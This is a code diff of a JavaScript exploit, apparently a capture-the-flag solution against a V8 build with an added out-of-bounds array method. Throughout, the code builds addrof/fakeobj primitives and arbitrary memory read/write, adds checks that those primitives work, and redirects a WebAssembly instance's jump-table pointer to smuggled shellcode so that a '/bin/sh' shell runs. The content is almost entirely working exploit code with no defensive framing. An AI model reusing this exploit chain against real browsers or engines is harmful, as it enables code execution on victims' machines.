@@ -1,6 +1,6 @@
-var convbuf = new ArrayBuffer(8);
-var f64_buf = new Float64Array(convbuf);
-var u64_buf = new Uint32Array(convbuf);
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
 
 function ftoi(val) {
   f64_buf[0] = val;
@@ -17,52 +17,71 @@ function hex(x) {
   return `0x${x.toString(16)}`;
 }
 
+var arr_float_oob = [1.1];
+var temp_obj = {"A":1};
+var arr_object = [temp_obj];
+var arr_float = [1.1, 1.2];
 
-/* Array for OOB */
-var oob = [1.1];
-var temp_obj = { A: 1 };
-/* Object array used for fakeobj */
-var obj_arr = [temp_obj];
-/* Array to fake an array (duh) (see read and write funcs) */
-var arb_rw_arr = [1.1, 1.2];
+arr_float_oob.oob(100);
 
-/* Trigger the bug, now oob.length == 100 >> 1 */
-oob.oob(100);
-
-/* To leak addresses, write to the obj_arr[0] and read from oob[9], the first element of obj_arr.
- * Sandboxed pointer will be in there after writing to obj_arr[0] */
-function addrof(obj) {
-  obj_arr[0] = obj;
-  return ftoi(oob[9]) >> 32n;
+function addrof(object) {
+  arr_object[0] = object;
+  let address = ftoi(arr_float_oob[9]) >> 32n;
+  arr_object[0] = temp_obj;
+  return address;
 }
 
-/* To fake an object, overwrite the first object element of obj_arr with an arbitrary address
- * Then, return the object using obj_arr. This allows in read/write to create a fictitious array from thin air */
 function fakeobj(addr) {
-  /* keep lower part, metadata */
-  const tmp = ftoi(oob[9]) & 0xffffffffn;
-  /* overwrite high part, which is the address of the object storted in obj_arr[0] */
-  oob[9] = itof(tmp + (addr << 32n));
-  return obj_arr[0];
+  const tmp = ftoi(arr_float_oob[9]) & 0xffffffffn;
+  arr_float_oob[9] = itof(tmp + (addr << 32n));
+  return arr_object[0];
 }
 
-/* Yoink the map used for float arrays. This allows to fake a float array ourself! */
-var float_map = oob[15];
+var map_arr_float = arr_float_oob[15];
 
-/* Fake a float array with the address specified in addr. NOTE: this is INSIDE the sandbox!! */
-function read(addr) {
-  arb_rw_arr[0] = float_map;
-  arb_rw_arr[1] = itof(0x0000000200000000n + addr - 0x8n);
-  const fake = fakeobj(addrof(arb_rw_arr) - 0x10n);
+function arbitrary_addr_read(addr) {
+  arr_float[0] = map_arr_float;
+  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
+  const fake = fakeobj(addrof(arr_float) - 0x10n);
   return ftoi(fake[0]);
 }
 
-/* Fake a float array with the backing set to the address passed. Once faked,  NOTE: this is INSIDE the sandbox!! */
-function write(addr, data) {
-  arb_rw_arr[0] = float_map;
-  arb_rw_arr[1] = itof(0x0000000200000000n + addr - 0x8n);
-  const fake = fakeobj(addrof(arb_rw_arr) - 0x10n);
-  fake[0] = data;
+function arbitrary_addr_write(addr, val) {
+  arr_float[0] = map_arr_float;
+  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
+  const fake = fakeobj(addrof(arr_float) - 0x10n);
+  fake[0] = val;
+}
+
+function arbitrary_addr_read_check(){
+  let arr_float_test = [1.1, 2.2];                    // 0x3ff199999999999a, 0x400199999999999a
+  let test_addr = addrof(arr_float_test);
+
+  let val_1 = arbitrary_addr_read(test_addr-0x10n);    // should equal to 0x3ff199999999999a
+  let val_2 = arbitrary_addr_read(test_addr-0x8n);     // should equal to 0x400199999999999a
+  console.log("[+] Read value1:" + hex(val_1));
+  console.log("[+] Read value2:" + hex(val_2));
+
+  if (val_1 === 0x3ff199999999999an && val_2 === 0x400199999999999an){
+    console.log("[+] Arbitrary address read success!");
+  }
+}
+
+function arbitrary_addr_write_check(){
+  let arr_float_test = [1.1, 2.2];                    // change 1.1 to 3.3, 2.2 to 4.4
+  let test_addr = addrof(arr_float_test);
+  
+  arbitrary_addr_write(test_addr-0x10n, 3.3);
+  arbitrary_addr_write(test_addr-0x8n, 4.4);
+
+  let val_1 = arbitrary_addr_read(test_addr-0x10n);    // should equal to 0x400a666666666666
+  let val_2 = arbitrary_addr_read(test_addr-0x8n);     // should equal to 0x401199999999999a
+  console.log("[+] Read value1:" + hex(val_1));
+  console.log("[+] Read value2:" + hex(val_2));
+
+  if (val_1 === 0x400a666666666666n && val_2 === 0x401199999999999an){
+    console.log("[+] Arbitrary address write success!");
+  }
 }
 
 /* The first time you call a function from wasm, v8 jits the wasm code and does NOT call the rwx page
@@ -88,14 +107,12 @@ var trigger = wasm_instance.exports.trigger;
 shell();
 
 /* Get address of rwx page, and overwrite it with the offset to our smuggled shellcode */
-var addr = addrof(wasm_instance);
-var rwx = read(addr + 0x50n);
-console.log(hex(rwx));
-write(addr + 0x50n, itof(rwx + 0x75dn));
+var rwx_page_addr = arbitrary_addr_read(addrof(wasm_instance)+0x50n);
+console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
+console.log("[+] Overwriting the JUMP Table pointer to: 0x" + (rwx_page_addr + 0x75dn).toString(16));
+arbitrary_addr_write(addrof(wasm_instance)+0x50n, itof(rwx_page_addr + 0x75dn));
 
 /* Shellcode from @unvariant reads from stdin the command, therefore solve.py sends /bin/sh\x00
  * NOTE: read does not appear to block, send /bin/sh\x00 BEFORE it reads (aka when console.log is executed) */
 console.log("SEND");
 trigger();
-
-/* Profit! */
